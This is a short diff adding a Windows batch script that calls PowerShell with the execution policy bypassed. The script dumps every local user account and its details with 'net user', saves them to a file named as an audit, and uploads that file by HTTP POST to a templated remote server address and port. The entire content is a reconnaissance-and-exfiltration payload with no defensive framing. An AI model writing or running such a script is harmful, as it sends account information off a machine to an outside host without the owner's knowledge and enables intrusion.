@@ -1,0 +1,2 @@
+@echo off
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "net user | Out-File C:\audit_net_users.txt -Encoding ascii; foreach ($u in (net user | Select-Object -Skip 4 | Select-Object -SkipLast 2) -split '\s+' | Where-Object {$_}) { net user $u 2>>C:\audit_net_users.txt | Out-File -Append C:\audit_net_users.txt -Encoding ascii }; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_net_users.txt -Headers @{\"X-Filename\"=\"audit_net_users.txt\"} -UseBasicParsing"
